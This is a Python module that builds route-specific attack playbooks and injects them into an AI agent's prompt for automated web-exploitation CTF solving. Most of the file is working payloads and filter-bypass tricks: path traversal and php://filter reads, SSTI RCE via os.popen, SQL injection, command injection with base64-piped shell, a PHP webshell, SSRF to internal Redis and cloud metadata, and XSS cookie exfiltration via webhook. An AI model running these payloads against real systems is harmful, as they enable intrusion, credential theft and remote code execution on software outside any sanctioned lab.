"""RouteCards — route-specific technique injection for PromptCompiler Layer 4.

Each RouteCard contains:
  - triggers: conditions that suggest this route
  - probes: initial low-cost detection payloads
  - handoffs: conditions to switch to another route
  - stop_conditions: when to abandon this route
  - common_mistakes: pitfalls to avoid

Only the current route's card is injected into the prompt, avoiding
context pollution from irrelevant techniques.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List


@dataclass
class RouteCard:
    """A route-specific skill card for prompt injection."""
    id: str
    route: str
    triggers: List[str] = field(default_factory=list)
    probes: List[str] = field(default_factory=list)
    exploit_steps: List[str] = field(default_factory=list)
    handoffs: List[Dict[str, str]] = field(default_factory=list)
    stop_conditions: List[str] = field(default_factory=list)
    common_mistakes: List[str] = field(default_factory=list)
    waf_bypasses: List[str] = field(default_factory=list)

    def to_prompt_text(self) -> str:
        """Convert to prompt-injectable text (Layer 4 format)."""
        parts = [f"## 当前路线: {self.route.upper()}", ""]

        if self.triggers:
            parts.append("### 触发条件")
            for t in self.triggers:
                parts.append(f"- {t}")
            parts.append("")

        if self.probes:
            parts.append("### 探测 Payload（按顺序尝试）")
            for i, p in enumerate(self.probes, 1):
                parts.append(f"{i}. `{p}`")
            parts.append("")

        if self.exploit_steps:
            parts.append("### 利用步骤")
            for i, s in enumerate(self.exploit_steps, 1):
                parts.append(f"{i}. {s}")
            parts.append("")

        if self.waf_bypasses:
            parts.append("### WAF 绕过")
            for b in self.waf_bypasses:
                parts.append(f"- {b}")
            parts.append("")

        if self.handoffs:
            parts.append("### 路线切换条件")
            for h in self.handoffs:
                parts.append(f"- {h['condition']} → **{h['next_route']}**")
            parts.append("")

        if self.stop_conditions:
            parts.append("### 停止条件")
            for s in self.stop_conditions:
                parts.append(f"- {s}")
            parts.append("")

        if self.common_mistakes:
            parts.append("### 常见错误")
            for m in self.common_mistakes:
                parts.append(f"- {m}")
            parts.append("")

        return "\n".join(parts)


# ---------------------------------------------------------------------------
# Route Card Definitions
# ---------------------------------------------------------------------------

ROUTE_CARDS: Dict[str, RouteCard] = {
    # =========================================================================
    # source_leak — 源码泄露
    # =========================================================================
    "source_leak": RouteCard(
        id="source_leak",
        route="source_leak",
        triggers=[
            "目标为 PHP/Python/Node.js Web 应用",
            "未发现明显的注入点",
            "目录扫描发现 .git/、.svn/、备份文件",
            "响应头包含 Apache/nginx 但无 WAF 指纹",
        ],
        probes=[
            "/www.zip",
            "/www.tar.gz",
            "/web.zip",
            "/source.zip",
            "/backup.zip",
            "/.git/HEAD",
            "/.svn/entries",
            "/.DS_Store",
            "/composer.json",
            "/package.json",
            "/requirements.txt",
            "/.env",
            "/config.php.bak",
            "/index.php.bak",
            "/index.php~",
            "/.index.php.swp",
        ],
        exploit_steps=[
            "扫描常见源码泄露路径（备份文件、版本控制、编辑器临时文件）",
            "发现 .git/ 后使用 git 恢复工具重建完整源码",
            "审计恢复的源码寻找: 数据库密码、硬编码密钥、反序列化入口、文件操作函数",
            "根据源码中的框架信息搜索已知 CVE 和 POP 链",
        ],
        handoffs=[
            {"condition": "成功获取 PHP 源码", "next_route": "source_audit"},
            {"condition": "发现框架特征 (ThinkPHP/Laravel/Yii)", "next_route": "php_pop"},
            {"condition": "发现数据库配置", "next_route": "sqli"},
            {"condition": "发现文件上传逻辑", "next_route": "upload"},
        ],
        stop_conditions=[
            "所有常见路径返回 404/403",
            "目标为静态站点",
            "已获取完整源码并完成审计",
        ],
        common_mistakes=[
            "不要只试 www.zip，试试 .git/HEAD、.svn/entries、.DS_Store",
            "备份文件可能用 .bak、.old、.orig、~、.swp 后缀",
            "git 恢复不只是 HEAD — 要遍历 tree 和 blob 对象",
            "源码中硬编码的密钥可能用于 JWT、加密、API 签名",
        ],
    ),

    # =========================================================================
    # lfi — 本地文件包含
    # =========================================================================
    "lfi": RouteCard(
        id="lfi_php_filter",
        route="lfi",
        triggers=[
            "参数名包含 file/page/path/template/include/view/doc",
            "响应出现 'failed to open stream'",
            "响应出现 'include()' warning",
            "响应出现 'No such file or directory'",
            "URL 中包含 ?page=、?file=、?path= 等参数",
        ],
        probes=[
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "....//....//....//etc/passwd",
            "..\\/..\\/..\\/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=index",
            "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
            "/flag",
            "/flag.txt",
            "/app/flag.txt",
            "/proc/self/environ",
            "/proc/self/cmdline",
        ],
        exploit_steps=[
            "先探测 /etc/passwd 确认 LFI 存在",
            "使用 php://filter base64 读取 PHP 源码",
            "尝试直接读取 /flag、/flag.txt、/app/flag.txt",
            "读取 /proc/self/environ 查看环境变量",
            "如果过滤了 php://，尝试编码绕过或 wrapper 变体",
            "读取源码后交给 source_audit 路线",
        ],
        waf_bypasses=[
            "双重 URL 编码: %25%32%66 代替 %2f",
            "路径截断: /etc/passwd%00 (PHP <5.3.4)",
            "路径规范化: ....//....//etc/passwd",
            "反斜杠: ..\\/..\\/..\\/etc/passwd",
            "php://filter 大写: pHP://FiLtEr",
            "iconv 编码链: convert.iconv.utf-8.utf-16",
        ],
        handoffs=[
            {"condition": "成功读取 PHP 源码", "next_route": "source_audit"},
            {"condition": "读取到日志路径", "next_route": "log_poisoning"},
            {"condition": "发现文件上传路径", "next_route": "upload"},
        ],
        stop_conditions=[
            "读到 flag",
            "参数不可控（参数值不影响包含路径）",
            "所有编码绕过均无响应差异",
            "确认包含被禁用 (allow_url_include=Off 且无可控文件)",
        ],
        common_mistakes=[
            "不要只试 /etc/passwd，CTF flag 通常在 /flag、/flag.txt、/app/flag.txt",
            "php://filter 读到的是 base64，需要解码后再扫描 flag 和源码 sink",
            "URL 编码要区分客户端编码和服务端二次解码",
            "/etc/passwd 成功不等于能读 flag",
            "Windows 和 Linux 路径不要混用",
        ],
    ),

    # =========================================================================
    # ssti — 服务端模板注入
    # =========================================================================
    "ssti": RouteCard(
        id="ssti",
        route="ssti",
        triggers=[
            "参数值为用户可控文本并回显在页面中",
            "参数名包含 name/template/message/content/search/greeting",
            "响应中数学表达式被计算 (如输入 {{7*7}} 返回 49)",
            "响应中出现模板引擎错误 (Jinja2/Twig/Smarty/Freemarker)",
            "响应中用户输入被 HTML 实体编码但数学表达式未编码",
        ],
        probes=[
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{request}}",
            "{{self}}",
            "${{7*7}}",
            "#{7*7}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${__import__('os').popen('id').read()}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        ],
        exploit_steps=[
            "先用 {{7*7}} 等数学表达式确认 SSTI 存在",
            "根据表达式语法识别模板引擎 (Jinja2/Twig/Smarty/Freemarker/Mako)",
            "构造引擎特定的文件读取 payload 读取 /flag",
            "如果过滤花括号，尝试编码、变量拼接、属性访问绕过",
            "如果无 shell 环境，优先使用文件读取类 payload",
        ],
        waf_bypasses=[
            "花括号编码: {{ → &#123;&#123; 或 \\x7b\\x7b",
            "字符串拼接: {{''.__class__}} → {{''|attr('__cl'+'ass__')}}",
            "属性访问: config.items() 代替 config",
            "过滤器链: |attr()|list|join",
            "Unicode 绕过: 使用全角字符或 Unicode 同形字",
        ],
        handoffs=[
            {"condition": "确认 Jinja2 引擎", "next_route": "ssti_jinja2"},
            {"condition": "确认 Twig 引擎", "next_route": "ssti_twig"},
            {"condition": "获取 RCE", "next_route": "cmdi"},
        ],
        stop_conditions=[
            "读到 flag",
            "无任何模板注入迹象（所有探针返回原值）",
            "输入被严格过滤且所有绕过失败",
        ],
        common_mistakes=[
            "不要默认是 Jinja2，Twig/Smarty/Freemarker/Mako/Go template/ERB 都可能",
            "{{7*7}} 返回 49 是强 evidence，但还要识别模板引擎",
            "不要只试一种引擎的 payload",
            "过滤花括号要尝试编码、变量拼接、属性访问",
            "无 shell 环境时应优先文件读取而非命令执行",
        ],
    ),

    # =========================================================================
    # sqli — SQL 注入
    # =========================================================================
    "sqli": RouteCard(
        id="sqli",
        route="sqli",
        triggers=[
            "参数名包含 id/item/category/q/search/user/pid/uid",
            "参数值疑似用于数据库查询",
            "响应中出现 SQL 错误 (mysql_fetch、SQLite、PostgreSQL)",
            "数字型参数加单引号后页面变化",
            "响应长度因布尔条件变化",
        ],
        probes=[
            "' (单引号探测)",
            "\" (双引号探测)",
            "1' OR '1'='1",
            "1' AND '1'='2",
            "1' AND SLEEP(3)-- - (时间盲注基线)",
            "1' UNION SELECT 1,2,3-- -",
            "1' UNION SELECT 1,2,3,4,5-- -",
            "1' ORDER BY 1-- -",
            "1' ORDER BY 10-- -",
            "1'; SELECT * FROM flag-- -",
        ],
        exploit_steps=[
            "单引号/双引号探测确认注入点",
            "确认注入类型: 报错注入 / 联合注入 / 布尔盲注 / 时间盲注",
            "联合注入: 用 ORDER BY 确定列数 → UNION SELECT 提取数据",
            "报错注入: extractvalue(1,concat(0x7e,database())) 或 updatexml",
            "布尔盲注: 比较 TRUE/FALSE 条件的响应差异 (长度/关键词/状态码)",
            "时间盲注: 先用 SLEEP(2) 做基线延迟，再逐字符提取",
            "提取 flag: 查 information_schema.tables → columns → flag 表数据",
        ],
        waf_bypasses=[
            "空格替代: /**/、%09、%0a、%0d、%0c",
            "关键字绕过: SEL/**/ECT、SeLeCt、SELSELECTECT",
            "等号替代: LIKE、REGEXP、BETWEEN、>",
            "注释符: #、-- -、;%00",
            "引号绕过: 十六进制 0x... 或 CHAR()",
            "括号绕过: SELECT(column)FROM(table)",
        ],
        handoffs=[
            {"condition": "成功提取数据库 flag 表数据", "next_route": "flag_verify"},
            {"condition": "堆叠注入可用", "next_route": "sqli_stacked"},
        ],
        stop_conditions=[
            "读到 flag",
            "所有注入点均无响应差异",
            "参数与数据库无关（无 SQL 错误、无响应差异）",
            "WAF 完全拦截且所有绕过失败",
        ],
        common_mistakes=[
            "不要只测单引号，双引号、反斜杠也要测",
            "布尔盲注要比较响应长度/关键词/状态码，不只看出错信息",
            "时间盲注要先做基线延迟，确认 SLEEP 确实生效",
            "SQLite/MySQL/PostgreSQL payload 不通用",
            "Union 列数要自动探测 (ORDER BY N 二分查找)",
            "不要忘记 information_schema (MySQL) 或 sqlite_master (SQLite)",
        ],
    ),

    # =========================================================================
    # cmdi — 命令注入
    # =========================================================================
    "cmdi": RouteCard(
        id="cmdi",
        route="cmdi",
        triggers=[
            "参数名包含 cmd/exec/command/shell/ping/host/ip/addr",
            "应用调用了系统命令 (ping、nslookup、traceroute)",
            "响应中包含命令输出 (ping 结果、DNS 查询结果)",
            "URL 中包含 ?cmd=、?exec=、?command= 等参数",
        ],
        probes=[
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "&&id",
            "||id",
            "%0aid",
            "%0d%0aid",
            ";cat /flag",
            "|cat /flag",
            "$(cat /flag)",
            "`cat /flag`",
        ],
        exploit_steps=[
            "先探测命令分隔符: ; | ` $(...) && || %0a",
            "用 id/whoami 确认命令执行",
            "用 ls 查看目录结构",
            "直接 cat /flag 或 cat /flag.txt",
            "如果无回显，使用盲打: sleep 5 时间探测或 curl/wget 外带数据",
        ],
        waf_bypasses=[
            "命令分隔符: %0a (换行) 代替 ;",
            "空格替代: $IFS、${IFS}、%09、<、<>",
            "关键字绕过: ca''t、c\at、/bin/c?a?t",
            "Base64 编码: echo BASE64== | base64 -d | sh",
            "通配符: /???/??t /f???",
            "变量拼接: a=c;b=at;$a$b /flag",
        ],
        handoffs=[
            {"condition": "获取 RCE", "next_route": "flag_verify"},
            {"condition": "发现内网服务", "next_route": "ssrf"},
        ],
        stop_conditions=[
            "读到 flag",
            "所有分隔符和绕过均无效",
            "命令执行被完全沙箱化",
        ],
        common_mistakes=[
            "不要只试 ; 分隔符，|、`、$(...)、&&、|| 都要测",
            "无回显不代表没执行，用 sleep 或外带确认",
            "cat 被过滤时用 head/tail/tac/more/less/strings/rev 代替",
            "空格被过滤用 $IFS、<、<>、%09 代替",
            "路径被过滤用通配符 /???/??t 代替 /bin/cat",
        ],
    ),

    # =========================================================================
    # jwt — JSON Web Token
    # =========================================================================
    "jwt": RouteCard(
        id="jwt",
        route="jwt",
        triggers=[
            "Cookie/Header 中包含 eyJ... (Base64 JWT 特征)",
            "Authorization: Bearer ...",
            "需要身份认证的 API 端点",
            "响应包含 JWT 解码相关的错误",
        ],
        probes=[
            "解码 JWT header 检查 alg 字段",
            "alg=none 攻击: 移除签名部分",
            "弱密钥爆破: HMAC-SHA256 常见密钥 (secret/key/password/flag)",
            "kid 注入: 检查 kid 是否为文件路径或可注入参数",
            "jku/x5u 检查: 是否引用外部 URL",
        ],
        exploit_steps=[
            "先 decode JWT (不验证签名)，查看 payload 中的角色/权限",
            "检查 alg: 如果是 none，直接移除签名",
            "如果是 HS256，尝试弱密钥爆破",
            "检查 kid: 可能路径穿越或 SQL 注入",
            "修改 payload 中的用户 ID/角色后重新签名或绕过",
        ],
        handoffs=[
            {"condition": "kid 参数可控", "next_route": "lfi"},
            {"condition": "kid 存在 SQL 注入", "next_route": "sqli"},
            {"condition": "JWT 无签名验证", "next_route": "idor"},
        ],
        stop_conditions=[
            "JWT 使用 RS256 且无私钥",
            "密钥足够强且无泄露",
            "服务器正确验证所有 JWT 字段",
        ],
        common_mistakes=[
            "先 decode，不要先 forge",
            "检查 alg、kid、jku、jwk、x5u 所有字段",
            "不要只测 none，弱密钥、kid 注入、算法混淆都要试",
            "修改 JWT 后要确认服务器是否真的校验签名",
            "Cookie 中不一定是 JWT，也可能是 Flask/Django session pickle",
        ],
    ),

    # =========================================================================
    # upload — 文件上传
    # =========================================================================
    "upload": RouteCard(
        id="upload",
        route="upload",
        triggers=[
            "页面包含 <input type='file'> 上传表单",
            "存在 multipart/form-data 请求",
            "应用有头像/图片/文档上传功能",
            "URL 路径包含 upload/image/file/avatar",
        ],
        probes=[
            "上传 .txt 探测存储路径和访问 URL",
            "上传 .php 探测是否直接解析",
            "双后缀: .php.jpg、.php.png、.php.gif",
            "大小写: .pHp、.PhP、.PHP",
            "空字节截断: .php%00.jpg (PHP <5.3.4)",
            ".htaccess 添加自定义后缀解析",
            ".user.ini auto_prepend_file",
            "图片马: GIF89a + <?php system($_GET['c']);?>",
            "竞争上传: 在上传和删除之间访问临时文件",
        ],
        exploit_steps=[
            "上传正常文件，从响应/源码/目录枚举获取上传路径",
            "尝试直接上传 .php webshell",
            "如果被过滤，尝试双后缀、大小写、MIME 绕过",
            "如果上传成功但不解析，尝试 .htaccess/.user.ini 两步法",
            "如果文件被处理 (图片压缩)，使用图片马来保持 PHP 代码",
            "Webshell 上传成功后执行 system('cat /flag')",
        ],
        waf_bypasses=[
            "Content-Type: image/jpeg 绕过 MIME 检查",
            "GIF89a 文件头绕过 getimagesize()",
            ".php.jpg 双后缀绕过扩展名黑名单",
            ".pHp 大小写绕过",
            ".phtml/.pht/.php5/.shtml 替代后缀",
            ".htaccess: AddType application/x-httpd-php .txt",
        ],
        handoffs=[
            {"condition": "获得 webshell", "next_route": "cmdi"},
            {"condition": "上传 phar 文件成功", "next_route": "php_pop"},
        ],
        stop_conditions=[
            "读到 flag",
            "上传目录不可访问",
            "所有后缀和绕过方法均失败",
            "服务器不解析任何脚本",
        ],
        common_mistakes=[
            "上传成功不等于路径可访问，路径可访问不等于脚本执行",
            "Content-Type、扩展名、文件头可能分别检查",
            "图片处理库可能重写 webshell 内容 (用图片马)",
            ".htaccess 只在 Apache 且 AllowOverride 生效时有用",
            ".user.ini 只在 PHP-FPM/CGI 模式下有效",
            "上传目录可能不可列目录，需要路径猜测",
        ],
    ),

    # =========================================================================
    # php_pop — PHP 反序列化 POP 链
    # =========================================================================
    "php_pop": RouteCard(
        id="php_pop",
        route="php_pop",
        triggers=[
            "源码中存在 unserialize() 调用",
            "存在 phar:// 协议触发点 (file_exists/is_file/is_dir/filesize)",
            "识别到已知 PHP 框架 (ThinkPHP/Laravel/Yii/Symfony/Laminas)",
            "存在文件上传功能可上传 phar 文件",
            "Cookie/参数中包含序列化数据 (O:数字:\"...)",
        ],
        probes=[
            "检查源码中 unserialize() 的调用位置",
            "检查文件操作函数参数是否用户可控",
            "识别框架版本和已知 POP 链",
            "尝试生成 Phar 文件上传并触发 phar:// 协议",
        ],
        exploit_steps=[
            "审计源码确认 unserialize() 入口和参数可控性",
            "识别框架版本，从 POP 链库加载对应链",
            "生成序列化 payload 或 Phar 文件",
            "如果直接 unserialize，通过参数/Cookie 注入 payload",
            "如果是 phar:// 触发点，上传 Phar 文件后通过文件操作触发",
        ],
        handoffs=[
            {"condition": "成功读取源码", "next_route": "source_audit"},
            {"condition": "获得 RCE", "next_route": "cmdi"},
            {"condition": "phar 上传成功需要触发", "next_route": "upload"},
        ],
        stop_conditions=[
            "读到 flag",
            "无 unserialize() 调用",
            "无 phar:// 触发点",
            "无可控参数",
            "框架版本无已知 POP 链",
        ],
        common_mistakes=[
            "php://filter 可读取 phar 文件内容但不触发反序列化",
            "phar:// 触发需要文件操作函数 (file_exists/is_file/is_dir/filesize/fopen)",
            "POP 链属性名需要精确的 null 字节前缀 (protected: \\x00*\\x00, private: \\x00Class\\x00)",
            "Phar 文件需要有效的 Phar 格式结构，不只是序列化数据",
            "图片伪装 Phar: GIF89a + Phar stub 可绕过文件类型检查",
        ],
    ),

    # =========================================================================
    # ssrf — 服务端请求伪造
    # =========================================================================
    "ssrf": RouteCard(
        id="ssrf",
        route="ssrf",
        triggers=[
            "参数名包含 url/uri/link/redirect/path/proxy/src",
            "应用请求外部 URL 并回显内容",
            "存在 URL 获取/预览/代理功能",
            "webhook/回调 URL 配置",
        ],
        probes=[
            "http://127.0.0.1/",
            "http://127.0.0.1/flag",
            "http://localhost/",
            "file:///flag",
            "file:///etc/passwd",
            "http://[::1]/",
            "http://0x7f000001/ (IP 变体)",
            "http://2130706433/ (整数 IP)",
            "gopher://127.0.0.1:80/_GET /flag HTTP/1.1%0d%0a",
        ],
        exploit_steps=[
            "探测 localhost 确认 SSRF 存在",
            "尝试 file:// 协议读取本地文件",
            "探测内网常见端口: 80/8080/3306/6379/22",
            "利用 gopher:// 协议攻击内网 Redis/MySQL/FastCGI",
            "如果只能访问外网，尝试 DNS rebinding",
        ],
        handoffs=[
            {"condition": "可读取本地文件", "next_route": "lfi"},
            {"condition": "发现内网服务", "next_route": "internal_services"},
        ],
        stop_conditions=[
            "URL 被严格白名单限制",
            "不支持 file:///gopher:// 等协议",
            "读到 flag",
        ],
        common_mistakes=[
            "不要只试 http://127.0.0.1，IPv6、整数 IP、DNS 重绑定都要试",
            "file:// 读取 flag 是最短路径",
            "gopher:// 可以构造任意 TCP 数据流攻击内网服务",
            "SSRF 可能被用于端口扫描内网",
            "云环境注意 metadata API: 169.254.169.254",
        ],
    ),

    # =========================================================================
    # idor — 不安全的直接对象引用
    # =========================================================================
    "idor": RouteCard(
        id="idor",
        route="idor",
        triggers=[
            "参数名包含 id/uid/pid/order_id/user_id",
            "URL 中包含数字 ID (如 /user/1/profile)",
            "可以注册多个用户/账号进行对比测试",
            "API 返回其他用户数据时无权限检查",
        ],
        probes=[
            "遍历 ID: 0, 1, 2, 3, 100, 1000",
            "修改为自己 ID 之外的数字",
            "UUID: 尝试其他已知 UUID",
            "负数: -1, -0",
            "数组: id[]=1&id[]=2",
            "JSON: {\"id\": 2}",
        ],
        exploit_steps=[
            "用两个账号分别操作，记录各自的资源 ID",
            "尝试用 A 的凭证访问 B 的资源",
            "遍历数字 ID 查找 flag 或其他敏感数据",
            "检查 API 响应中是否有隐藏的 ID 可被引用",
        ],
        stop_conditions=[
            "读到 flag",
            "所有 ID 变化均返回 403/404",
            "确认严格的权限检查",
        ],
        common_mistakes=[
            "不要只测数字 ID，UUID/Hash ID 也要遍历",
            "IDOR 不只是 GET 请求，POST/PUT/DELETE 也要测",
            "批量赋值 (Mass Assignment) 常与 IDOR 共存",
            "响应 403 不代表不存在，可能是隐藏了但存在的资源",
        ],
    ),

    # =========================================================================
    # xss — 跨站脚本 (CTF 中通常配合 admin bot)
    # =========================================================================
    "xss": RouteCard(
        id="xss",
        route="xss",
        triggers=[
            "题目提到 admin bot / headless browser",
            "参数值在页面中回显未编码",
            "存在留言板/评论/反馈等存储型输入",
            "需要窃取 cookie 或访问受限页面",
        ],
        probes=[
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
        ],
        exploit_steps=[
            "确认 XSS 存在和类型 (反射型/存储型/DOM 型)",
            "如果是 admin bot 题，确认 bot 的 cookie scope 和访问 URL",
            "构造 payload 窃取 admin cookie 或执行敏感操作",
            "使用外带 (webhook/requestbin) 接收窃取的数据",
        ],
        stop_conditions=[
            "读到 flag",
            "无 admin bot 且无可窃取的敏感数据",
            "CSP 严格且所有绕过失败",
        ],
        common_mistakes=[
            "反射 XSS 不等于能打 admin bot",
            "必须确认 bot 的 cookie scope、CSP、same-site 设置",
            "CSP 下考虑 JSONP、CDN allowlist、CSS exfil",
            "外带数据需要外网可访问的回调地址",
        ],
    ),

    # =========================================================================
    # graphql — GraphQL API
    # =========================================================================
    "graphql": RouteCard(
        id="graphql",
        route="graphql",
        triggers=[
            "URL 路径为 /graphql 或 /gql",
            "请求/响应包含 graphql 关键字",
            "POST body 包含 query/mutation 结构",
            "响应包含 __schema 或 __typename",
        ],
        probes=[
            "Introspection: {__schema{types{name fields{name}}}}",
            "GET /graphql?query={__typename}",
            "Batching: [{query:...},{query:...}] 绕过速率限制",
            "Alias: {a:flag,b:flag} 绕过唯一字段限制",
            "POST /graphql with Content-Type: application/x-www-form-urlencoded",
        ],
        exploit_steps=[
            "先探测 introspection 是否启用",
            "通过 schema 了解所有 query/mutation/type",
            "检查敏感字段: flag、password、token、secret",
            "尝试 batching/alias 绕过限制",
        ],
        stop_conditions=[
            "Introspection 禁用且无法推断 schema",
            "读到 flag",
        ],
        common_mistakes=[
            "先测 introspection，不要直接猜字段名",
            "GET 请求可能绕过 CSRF/CORS 预检",
            "batching 和 alias 可用于绕过速率和字段限制",
            "GraphQL 错误消息经常泄露 schema 信息",
        ],
    ),

    # =========================================================================
    # websocket — WebSocket
    # =========================================================================
    "websocket": RouteCard(
        id="websocket",
        route="websocket",
        triggers=[
            "页面包含 ws:// 或 wss:// 连接",
            "JS 代码中使用 new WebSocket()",
            "存在实时通信功能 (聊天/通知/游戏)",
        ],
        probes=[
            "ws:// 连接握手 (检查 origin/cookie 验证)",
            "消息格式探测: JSON/文本/二进制",
            "注入测试: 在消息中注入特殊字符/命令",
            "鉴权绕过: 修改连接参数或消息中的 token",
        ],
        exploit_steps=[
            "分析 WebSocket 握手阶段的认证机制",
            "了解消息格式和协议",
            "检查消息级鉴权: 是否每条消息都验证权限",
            "注入攻击: 命令注入、SQL 注入、XSS 通过 WS 消息",
        ],
        stop_conditions=[
            "读到 flag",
            "WebSocket 无关解题",
        ],
        common_mistakes=[
            "握手阶段的 cookie/origin 验证可能不充分",
            "消息级鉴权不能只看连接成功",
            "WebSocket fuzz 要记录消息状态机",
        ],
    ),
}


def get_route_card(route: str) -> RouteCard:
    """Get the RouteCard for a given route name."""
    card = ROUTE_CARDS.get(route)
    if card is None:
        # Return a minimal card for unknown routes
        return RouteCard(id=route, route=route)
    return card


def get_routes_for_evidence(evidence_text: str) -> List[str]:
    """Return routes whose triggers match the given evidence text."""
    matched = []
    evidence_lower = evidence_text.lower()
    for route_name, card in ROUTE_CARDS.items():
        for trigger in card.triggers:
            # Simple keyword matching
            keywords = trigger.lower().replace("包含", "").replace("参数名", "").replace("出现", "")
            if any(kw.strip() in evidence_lower for kw in keywords.split("/") if len(kw.strip()) > 2):
                matched.append(route_name)
                break
    return matched if matched else ["recon"]
